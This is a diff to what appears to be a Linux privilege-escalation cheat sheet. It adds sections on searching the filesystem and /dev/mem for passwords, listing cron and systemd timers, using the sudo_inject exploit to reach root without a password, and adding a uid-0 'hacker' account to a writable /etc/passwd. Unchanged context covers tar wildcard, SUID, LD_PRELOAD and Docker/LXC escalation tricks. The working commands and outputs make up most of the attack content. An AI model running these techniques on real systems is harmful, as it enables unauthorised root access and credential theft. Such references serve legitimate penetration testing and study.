@@ -13,7 +13,14 @@
 ## Summary
 
 * [Checklist](#checklist)
-* [Cron job](#cron-job)
+* [Looting for passwords](#looting-for-passwords)
+    * [Files containing passwords](#files-containing-passwords)
+    * [Last edited files](#last-edited-files)
+    * [In memory passwords](#in-memory-passwords)
+    * [Find sensitive files](#find-sensitive-files)
+* [Scheduled tasks](#scheduled-tasks)
+    * [Cron jobs](#cron-jobs)
+    * [Systemd timers](#systemd-timers)
 * [SUID](#suid)
     * [Find SUID binaries](#find-suid-binaries)
     * [Create a SUID binary](#create-a-suid-binary)
@@ -25,8 +32,10 @@
     * [NOPASSWD](#nopasswd)
     * [LD_PRELOAD and NOPASSWD](#ld-preload-and-passwd)
     * [Doas](#doas)
+    * [sudo_inject](#sudo-inject)
 * [GTFOBins](#gtfobins)
 * [Wildcard](#wildcard)
+* [Writable /etc/passwd](#writable---etc---passwd)
 * [NFS Root Squashing](#nfs-root-squashing)
 * [Shared Library](#shared-library)
     * [ldconfig](#ldconfig)
@@ -53,7 +62,7 @@
   * Extracts password policies and hash storage method information
   * Checks umask value
   * Checks if password hashes are stored in /etc/passwd
-  * Extract full details for ‘default’ uid’s such as 0, 1000, 1001 etc
+  * Extract full details for 'default' uid's such as 0, 1000, 1001 etc
   * Attempt to read restricted files i.e. /etc/shadow
   * List current users history files (i.e .bash_history, .nano_history etc.)
   * Basic SSH checks
@@ -61,8 +70,8 @@
   * Which users have recently used sudo
   * Determine if /etc/sudoers is accessible
   * Determine if the current user has Sudo access without a password
-  * Are known ‘good’ breakout binaries available via Sudo (i.e. nmap, vim etc.)
-  * Is root’s home directory accessible
+  * Are known 'good' breakout binaries available via Sudo (i.e. nmap, vim etc.)
+  * Is root's home directory accessible
   * List permissions for /home/
 * Environmental:
   * Display current $PATH
@@ -94,7 +103,7 @@
   * Locate all SUID/GUID files
   * Locate all world-writable SUID/GUID files
   * Locate all SUID/GUID files owned by root
-  * Locate ‘interesting’ SUID/GUID files (i.e. nmap, vim etc)
+  * Locate 'interesting' SUID/GUID files (i.e. nmap, vim etc)
   * Locate files with POSIX capabilities
   * List all world-writable files
   * Find/list all accessible *.plan files and display contents
@@ -108,14 +117,55 @@
   * Checks to see if the host has Docker installed
   * Checks to determine if we're in an LXC container
 
-## Cron job
+## Looting for passwords
+
+### Files containing passwords
+
+```powershell
+grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
+find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
+```
+
+### Last edited files
+
+Files that were edited in the last 10 minutes
+
+```powershell
+find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
+```
+
+### In memory passwords
+
+```powershell
+strings /dev/mem -n10 | grep -i PASS
+```
+
+### Find sensitive files
+
+```powershell
+$ locate password | more           
+/boot/grub/i386-pc/password.mod
+/etc/pam.d/common-password
+/etc/pam.d/gdm-password
+/etc/pam.d/gdm-password.original
+/lib/live/config/0031-root-password
+...
+```
+
+## Scheduled tasks
+
+### Cron jobs
 
 Check if you have access with write permission on these files.   
 Check inside the file, to find other paths with write permissions.   
 
 ```powershell
 /etc/init.d
+/etc/cron*
+/etc/crontab
+/etc/cron.allow
 /etc/cron.d 
+/etc/cron.deny
 /etc/cron.daily
 /etc/cron.hourly
 /etc/cron.monthly
@@ -124,11 +174,21 @@ Check inside the file, to find other paths with write permissions.
 /etc/exports
 /etc/at.allow
 /etc/at.deny
-/etc/crontab
-/etc/cron.allow
-/etc/cron.deny
 /etc/anacrontab
+/var/spool/cron
 /var/spool/cron/crontabs/root
+```
+
+## Systemd timers
+
+```powershell
+systemctl list-timers --all
+NEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES
+Mon 2019-04-01 02:59:14 CEST  15h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily.timer              apt-daily.service
+Mon 2019-04-01 06:20:40 CEST  19h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service
+Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+
+3 timers listed.
 ```
 
 ## SUID
@@ -197,7 +257,6 @@ sh-5.0# id
 uid=0(root) gid=1000(swissky)
 ```
 
-
 ## SUDO
 
 ### NOPASSWD
@@ -250,6 +309,24 @@ There are some alternatives to the `sudo` binary such as `doas` for OpenBSD, rem
 permit nopass demo as root cmd vim
 ```
 
+### sudo_inject
+
+Using [https://github.com/nongiach/sudo_inject](https://github.com/nongiach/sudo_inject)
+
+```powershell
+$ sudo whatever
+[sudo] password for user:    
+# Press <ctrl>+c since you don't have the password. 
+# This creates an invalid sudo tokens.
+$ sh exploit.sh
+.... wait 1 seconds
+$ sudo -i # no password required :)
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Slides of the presentation : [https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf](https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf)
+
 ## GTFOBins
 
 [GTFOBins](https://gtfobins.github.io) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
@@ -264,7 +341,7 @@ The project collects legitimate functions of Unix binaries that can be abused to
 
 ## Wildcard
 
-By using tar with –checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. “Tricking” root to use the specific options is quite easy, and that’s where the wildcard comes in handy.
+By using tar with –checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. “Tricking” root to use the specific options is quite easy, and that's where the wildcard comes in handy.
 
 ```powershell
 # create file for exploitation
@@ -277,6 +354,27 @@ tar cf archive.tar *
 ```
 
 Tool: [wildpwn](https://github.com/localh0t/wildpwn)
+
+
+## Writable /etc/passwd
+
+First generate a password with one of the following commands
+
+```powershell
+openssl passwd -1 -salt hacker hacker
+mkpasswd -m SHA-512 hacker
+python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
+```
+
+Then add the user `hacker` and add the generated password.
+
+```powershell
+hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
+```
+
+E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
+
+You can now use the `su` command with `hacker:hacker`
 
 
 ## NFS Root Squashing
@@ -358,9 +456,6 @@ int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp
 }
 ```
 
-
-
-
 ## Groups
 
 ### Docker
@@ -423,14 +518,15 @@ lxc start mycontainer
 lxc exec mycontainer /bin/sh
 ```
 
-
 ## References
 
 - [SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m](https://mn3m.info/posts/suid-vs-capabilities/)
-- [Privilege escalation via Docker - April 22, 2015 — Chris Foster](https://fosterelli.co/privilege-escalation-via-docker.html)
-- [An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ AUGUST 21, 2018](https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/)
+- [Privilege escalation via Docker - April 22, 2015 - Chris Foster](https://fosterelli.co/privilege-escalation-via-docker.html)
+- [An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ - AUGUST 21, 2018](https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/)
 - [Exploiting wildcards on Linux - Berislav Kucan](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/)
 - [Code Execution With Tar Command - p4pentest](http://p4pentest.in/2016/10/19/code-execution-with-tar-command/)
 - [Back To The Future: Unix Wildcards Gone Wild - Leon Juranic](http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)
 - [HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018](https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/)
 - [Privilege Escalation via lxd - @reboare](https://reboare.github.io/lxd/lxd-escape.html)
+- [Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)
+- [Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc](https://github.com/nongiach/sudo_inject)
